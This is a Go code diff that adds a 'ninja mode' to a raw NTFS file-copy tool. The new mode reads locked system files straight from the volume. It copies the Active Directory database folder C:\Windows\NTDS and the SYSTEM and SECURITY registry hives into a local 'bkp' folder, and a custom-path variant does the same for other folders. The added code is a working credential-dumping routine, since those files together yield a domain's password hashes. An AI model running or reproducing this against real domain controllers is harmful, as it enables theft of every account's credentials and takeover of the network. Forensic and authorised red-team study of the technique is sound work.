@@ -5,13 +5,14 @@ package main
 import (
 	"errors"
 	"flag"
-	"golang.org/x/sys/windows"
 	"io"
 	"log"
 	"os"
 	"os/user"
 	"regexp"
 	"strings"
+
+	"golang.org/x/sys/windows"
 
 	ntfs "www.velocidex.com/golang/go-ntfs/parser"
 )
@@ -24,6 +25,8 @@ const (
 
 var (
 	inFile                            = flag.String("in", "", "input file")
+	inPath                            = flag.String("inpath", "", "input path")
+	ninja                             = flag.Bool("ninja", false, "ninja mode")
 	outFile                           = flag.String("out", "", "output file")
 	ErrReturnedNil                    = errors.New("result returned nil reference")
 	ErrInvalidInput                   = errors.New("invalid input")
@@ -55,10 +58,74 @@ func main() {
 	if err := CheckIfElevated(); err != nil {
 		panic(err)
 	}
+	// Check if ninja => list folder C:\Windows\NTDS and copy each file into C:\Windows\NTDS\bkp
+	if *ninja || *inPath != "" {
+		ntdsPath := ""
+		if *ninja {
+			log.Println("Ninja mode activated.")
+			ntdsPath = "C:\\Windows\\NTDS"
+		} else {
+			log.Println("Ninja mode activated with custom path.")
+			ntdsPath = *inPath
+		}
+		ntdsBkpPath := ntdsPath + "\\bkp"
+		// create ntdsBkpPath if missing
+		if _, err := os.Stat(ntdsBkpPath); os.IsNotExist(err) {
+			err = os.Mkdir(ntdsBkpPath, 0755)
+			if err != nil {
+				log.Fatalln(err)
+			}
+		}
+		log.Println("Ninja mode activated. src=", ntdsPath, " dst=", ntdsBkpPath)
+		ntdsFiles, err := os.ReadDir(ntdsPath)
+		if err != nil {
+			log.Fatalln(err)
+		}
+		for _, file := range ntdsFiles {
+			if file.IsDir() {
+				continue
+			}
+			ntdsFile := ntdsPath + "\\" + file.Name()
+			ntdsBkpFile := ntdsBkpPath + "\\" + file.Name()
+			npath := EnsureNTFSPath(ntdsFile)
+			// fullpath can leave with prefixing backslash, and this library require file path in slash (*nix format)
+			npathRela := strings.Join(npath[1:], "//")
+			if err = TryRetrieveFile(npath[0], npathRela, ntdsBkpFile); err != nil {
+				log.Printf("[!]Failled to copy %s: %v", ntdsFile, err)
+			}
+		}
+
+		if *ninja {
+			// backup SYSTEM and SECURITY hive
+			systemFile := "C:\\Windows\\System32\\config\\SYSTEM"
+			securityFile := "C:\\Windows\\System32\\config\\SECURITY"
+			systemBkpFile := ntdsBkpPath + "\\SYSTEM"
+			securityBkpFile := ntdsBkpPath + "\\SECURITY"
+
+			systemPath := EnsureNTFSPath(systemFile)
+			systemPathRela := strings.Join(systemPath[1:], "//")
+			if err = TryRetrieveFile(systemPath[0], systemPathRela, systemBkpFile); err != nil {
+				log.Printf("[!]Failed to copy SYSTEM hive: %v", err)
+			}
+
+			securityPath := EnsureNTFSPath(securityFile)
+			securityPathRela := strings.Join(securityPath[1:], "//")
+			if err = TryRetrieveFile(securityPath[0], securityPathRela, securityBkpFile); err != nil {
+				log.Printf("[!]Failed to copy SECURITY hive: %v", err)
+			}
+		}
+
+		log.Println("Ninja mode finished.")
+		return
+	}
+
+	if *inFile == "" || *outFile == "" {
+		log.Fatalln("Please provide input and output file.")
+	}
 	npath := EnsureNTFSPath(*inFile)
 	// fullpath can leave with prefixing backslash, and this library require file path in slash (*nix format)
 	npathRela := strings.Join(npath[1:], "//")
-	err := TryRetrieveFile(npath[0], npathRela)
+	err := TryRetrieveFile(npath[0], npathRela, *outFile)
 	if err != nil {
 		log.Fatalln(err)
 	}
@@ -73,7 +140,8 @@ func EnsureNTFSPath(volFilePath string) []string {
 // to retrieve file metadata. Then use OpenStream to try extract file from (ATTR(Type=128)-$DATA),
 // read data via raw device require pagedReader, each read operation must fit a cluster size,
 // which by default, is 4096 bytes.
-func TryRetrieveFile(volDiskLetter string, filePath string) error {
+func TryRetrieveFile(volDiskLetter string, filePath string, outfile string) error {
+	log.Printf("Copy file %s from NTFS volume to %s.", filePath, outfile)
 	log.Println("Check Drive Letter.")
 	// check user input
 	var IsDiskLetter = regexp.MustCompile(`^[a-zA-Z]:$`).MatchString
@@ -154,7 +222,7 @@ func TryRetrieveFile(volDiskLetter string, filePath string) error {
 	//
 
 	log.Println("Well, let's start copy now.")
-	err = CopyToDestinationFile(corrFileReader, *outFile)
+	err = CopyToDestinationFile(corrFileReader, outfile)
 	if err != nil {
 		return err
 	}
